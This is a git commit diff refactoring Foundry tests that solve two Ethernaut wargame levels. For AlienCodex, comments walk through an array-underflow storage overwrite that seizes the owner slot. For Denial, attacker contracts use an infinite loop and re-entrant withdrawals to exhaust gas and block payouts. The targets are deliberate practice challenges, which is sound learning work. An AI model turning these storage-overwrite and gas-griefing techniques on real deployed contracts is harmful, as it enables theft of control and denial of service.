f4305e93dacb7df001d3d7f905357d55a84766b7
tienshaoku <tienshaoku@gmail.com>
2026-01-02 23:29:45 +0000

    refactor: AlienCodex & Denial

--- test/openzeppelin-ethernaut/AlienCodex.t.sol
+++ test/openzeppelin-ethernaut/AlienCodex.t.sol
@@ -1,14 +1,15 @@
-// 0.5.0 isn't compatible with foundry
+ // 0.5.0 isn't compatible with foundry
 
 // solution:
 // 1. makeContact()
 // 2. retract() to make the array underflow (theoretically can also push an astronomical amount)
 // 3. now the array underflows, can access any storage since array is the entrance to storage
-// 4. codex's (array) length is stored at slot 1, which means its content starts at keccak256(1) + index
-//    For example, the first content is at slot number (keccak256(1) + 0)
-// 5. Thus, to access owner on the first slot: type(uint256).max - keccak256(1) + 1 (cannot use 2^256 directly)
+// 4. codex's (array) length is stored at slot 1, as address and contact are packed into the same slot,
+//    which means its content starts from keccak256(1) + index, i.e. the first content is at slot number (keccak256(1) + 0)
+// 5. Thus, to access owner on the first slot: 2^256 - keccak256(1) == type(uint256).max - keccak256(1) + 1
 //    Imagine if there're only 16 slots and data start at 12, then the first slot can be accessed as the (16 - 12)th of the array
-//    In this case, it's 35707666377435648211887908874984608119992236509074197713628505308453184860938
-//    can use console.log() to print out these values:
+//    use console.log() to print out these values:
+//    // 35707666377435648211887908874984608119992236509074197713628505308453184860938
 //    - console.logUint(type(uint256).max - uint256(keccak256(abi.encode(1))) + 1);
+//    // don't cast address to bytes20 directly cuz bytes are right padded, treated like bytes array, diff from uint and address
 //    - console.logBytes32(bytes32(uint256(uint160(vm.envAddress("MY_ADDRESS")))));
--- test/openzeppelin-ethernaut/Denial.t.sol
+++ test/openzeppelin-ethernaut/Denial.t.sol
@@ -4,51 +4,53 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Denial.sol";
 
-// infinite loop
 contract MiddleMan {
+    receive() external payable {
+        while (true) {}
+    }
+}
+
+// this involves repeatedly touching storage, making the two storage writes become warm from previous rounds
+contract MiddleMan2 {
     receive() external payable {
         Denial(payable(msg.sender)).withdraw();
     }
 }
 
-// type(uint256).max > 1m
-contract MiddleMan2 {
-    receive() external payable {
-        for (uint256 i; i < type(uint256).max; i++) {
-            i;
-        }
-    }
-}
-
-// since there's a gas limit, make sure the gas is exhausted at the partner.call() line
+// exhaust gas during partner.call()
+// according to 63/64 gas rule, external calls have at most 63/64 of the remaining gas
+// 1_000_000 / 64 = 15,625
+// thus, tx will run out of gas with 1 cold storage writing ~22,100; warm storage write ~2,900
+// 63/64 rule source: https://www.cyfrin.io/glossary/63-64-gas-rule-solidity-code-example
 contract DenialTest is Test {
     // Denial instance = Denial(payable(vm.envAddress("DENIAL")));
     Denial instance;
-    uint256 GAS_LIMIT = 1_000_000;
+    uint256 gasLimit = 1_000_000;
 
     function setUp() public {
         instance = new Denial();
+        address(instance).call{value: 1 ether}("");
     }
 
-    function test_infinite_loop() public {
+    function test1() public {
         MiddleMan middleMan = new MiddleMan();
         instance.setWithdrawPartner(address(middleMan));
 
-        uint256 startGas = gasleft();
-        vm.prank(instance.owner());
-        instance.withdraw();
+        vm.expectRevert();
+        instance.withdraw{gas: gasLimit}();
 
-        assertTrue(startGas - gasleft() > GAS_LIMIT);
+        vm.expectCall(address(middleMan), "");
+        instance.withdraw{gas: 6_000_000}();
     }
 
-    function test_uint256_max() public {
+    function test2() public {
         MiddleMan2 middleMan = new MiddleMan2();
         instance.setWithdrawPartner(address(middleMan));
 
-        uint256 startGas = gasleft();
-        vm.prank(instance.owner());
-        instance.withdraw();
+        vm.expectRevert();
+        instance.withdraw{gas: gasLimit}();
 
-        assertTrue(startGas - gasleft() > GAS_LIMIT);
+        vm.expectCall(address(middleMan), "");
+        instance.withdraw{gas: 3_000_000}();
     }
 }
